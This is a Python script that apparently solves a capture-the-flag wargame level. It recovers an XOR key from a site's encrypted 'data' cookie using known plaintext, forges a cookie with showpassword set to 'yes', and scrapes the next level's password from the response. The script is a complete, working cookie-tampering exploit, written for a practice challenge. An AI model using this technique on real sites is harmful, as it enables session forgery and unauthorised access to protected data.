#!/usr/bin/env python3

import requests
import base64
import re
import urllib.parse
from levels_credentials import credentials, folder

level_url = credentials[11]["url"]
level_username = credentials[11]["level"]
level_password = credentials[11]["password"]

next_level_url = credentials[12]["url"]
next_level_username = credentials[12]["level"]
next_level_pass = folder + next_level_username

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii")}
post_data = {"bgcolor":"#ffffff"}

response = requests.post(level_url, headers=heads, data=post_data)
cookie_encoded = response.cookies.get_dict()["data"]
cookie_b64 = urllib.parse.unquote(cookie_encoded)
cookie = base64.b64decode(cookie_b64.encode("ascii"))

initial_cookie = '{"showpassword":"no","bgcolor":"#ffffff"}'

key_long = ''
for i in range(len(cookie)):
    key_long += chr(cookie[i] ^ ord(initial_cookie[i]))

key = key_long[0:4]

next_cookie = '{"showpassword":"yes","bgcolor":"#ffffff"}'
next_cookie_xor = ''

for i in range(len(next_cookie)):
    next_cookie_xor += chr(ord(next_cookie[i]) ^ ord(key[i % len(key)]))

next_cookie_b64 = base64.b64encode(bytes(next_cookie_xor.encode("ascii"))).decode("ascii")
next_cookies = {"data":next_cookie_b64}

next_response = requests.post(level_url, headers=heads, data=post_data, cookies=next_cookies)
data = next_response.text
strings = re.split('\s|<', data)
next_pass = strings[strings.index(next_level_username) + 2]
print(next_pass)
